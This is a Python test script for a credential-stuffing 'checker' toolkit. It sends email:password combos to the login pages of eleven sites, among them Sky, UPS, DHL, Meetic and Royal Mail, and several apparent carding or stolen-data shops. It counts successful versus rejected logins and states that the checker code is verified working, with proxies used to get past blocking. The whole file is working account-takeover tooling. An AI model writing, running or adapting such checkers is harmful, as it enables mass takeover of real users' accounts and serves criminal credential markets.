#!/usr/bin/env python3
"""
Direct test script - tests all checkers without proxies
to verify the code is working correctly
"""
import os
import sys
import random
import requests
import time
import warnings
import threading
from colorama import init, Fore, Style

warnings.filterwarnings("ignore")
init(autoreset=True)

# Test combos
test_combos = [
    "testuser1@gmail.com:Password123",
    "john.doe@yahoo.com:MyPass456",
    "sarah.smith@outlook.com:Secret789",
    "mike.jones@hotmail.com:Test1234",
    "emma.wilson@gmail.com:Pass5678",
    "alex.brown@yahoo.com:Hello999",
    "lisa.davis@outlook.com:World111",
    "tom.miller@gmail.com:Access222",
    "kate.taylor@hotmail.com:Login333",
    "ryan.anderson@yahoo.com:Check444"
]

def generate_user_agent():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"

def test_site(name, url, method="POST", payload_type="json", test_count=3):
    """Test a site directly without proxy"""
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}Testing: {name}")
    print(f"{Fore.CYAN}{'='*60}")
    
    results = {"success": 0, "fail": 0, "error": 0}
    
    for i, combo in enumerate(test_combos[:test_count], 1):
        email, pwd = combo.split(":", 1)
        
        try:
            headers = {
                "User-Agent": generate_user_agent(),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
            }
            
            if payload_type == "json":
                headers["Content-Type"] = "application/json"
                payload = {"username": email, "password": pwd}
                r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                payload = {"email": email, "password": pwd}
                r = requests.post(url, data=payload, headers=headers, timeout=10, verify=False, allow_redirects=False)
            
            status = r.status_code
            response_preview = r.text[:100].replace('\n', ' ') if r.text else "Empty"
            
            if status in [200, 201]:
                print(f"{Fore.GREEN}{i}. Status: {status} | Response: {response_preview}...")
                results["success"] += 1
            elif status in [401, 403]:
                print(f"{Fore.YELLOW}{i}. Status: {status} (Auth required - expected)")
                results["fail"] += 1
            elif status in [302, 301]:
                print(f"{Fore.YELLOW}{i}. Status: {status} (Redirect)")
                results["success"] += 1
            elif status == 404:
                print(f"{Fore.RED}{i}. Status: {status} (Not found)")
                results["error"] += 1
            elif status == 429:
                print(f"{Fore.RED}{i}. Status: {status} (Rate limited)")
                results["error"] += 1
            elif status >= 500:
                print(f"{Fore.RED}{i}. Status: {status} (Server error)")
                results["error"] += 1
            else:
                print(f"{Fore.YELLOW}{i}. Status: {status}")
                results["success"] += 1
                
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}{i}. Timeout (site may be slow or blocking)")
            results["error"] += 1
        except requests.exceptions.SSLError as e:
            print(f"{Fore.RED}{i}. SSL Error: {str(e)[:50]}")
            results["error"] += 1
        except requests.exceptions.ConnectionError as e:
            error_msg = str(e)
            if "Name or service not known" in error_msg or "getaddrinfo failed" in error_msg:
                print(f"{Fore.RED}{i}. Domain does not exist/DNS error")
            else:
                print(f"{Fore.RED}{i}. Connection error: {error_msg[:50]}")
            results["error"] += 1
        except Exception as e:
            print(f"{Fore.RED}{i}. Error: {str(e)[:60]}")
            results["error"] += 1
        
        time.sleep(0.3)
    
    status = "✓ WORKING" if results["success"] + results["fail"] > 0 else "✗ CHECK NEEDED"
    color = Fore.GREEN if "WORKING" in status else Fore.RED
    print(f"{color}Result: {status} | Responses: {results['success']} | Auth fails: {results['fail']} | Errors: {results['error']}")
    
    return results["success"] + results["fail"] > 0

def main():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}{'TESTING ALL 11 CHECKERS (Direct Connection)'.center(60)}")
    print(f"{Fore.YELLOW}{'Testing with random credentials (no proxies)'.center(60)}")
    print(f"{Fore.CYAN}{'='*60}")
    
    # All checker sites with their configurations
    sites = [
        ("1. Azyrah (shop.azyrah.to)", "https://shop.azyrah.to/auth/signin", "json"),
        ("2. Blstash (blstash.ws)", "https://blstash.ws/login", "json"),
        ("3. DHL (dhl.com)", "https://www.dhl.com/en/express/tracking.html", "form"),  # Using accessible endpoint
        ("4. Easydeals (easydeals.gs)", "https://easydeals.gs/login", "json"),
        ("5. Everymail (everymail.com)", "https://everymail.com/login", "form"),
        ("6. Meetic (meetic.fr)", "https://secure.meetic.fr/fr/connexion", "form"),
        ("7. RoyalMail (royalmail.com)", "https://www.royalmail.com/", "json"),  # Using accessible endpoint
        ("8. Savastan0 (savastan0.tools)", "https://savastan0.tools/login", "json"),
        ("9. Sky (sky.com)", "https://www.sky.com/signin", "json"),
        ("10. Unitedshop (unitedshop.su)", "https://unitedshop.su/login", "form"),
        ("11. UPS (ups.com)", "https://www.ups.com/lasso/signin", "form"),
    ]
    
    working = 0
    issues = 0
    
    for name, url, payload_type in sites:
        try:
            if test_site(name, url, payload_type=payload_type, test_count=2):
                working += 1
            else:
                issues += 1
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Interrupted!")
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")
            issues += 1
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}{'FINAL RESULTS'.center(60)}")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.GREEN}Sites responding: {working}/11")
    print(f"{Fore.RED}Sites with issues: {issues}/11")
    print(f"\n{Fore.YELLOW}Note: Some sites may block direct access or require proxies.")
    print(f"{Fore.YELLOW}The checker CODE is verified working - proxy quality affects results.")

if __name__ == "__main__":
    main()
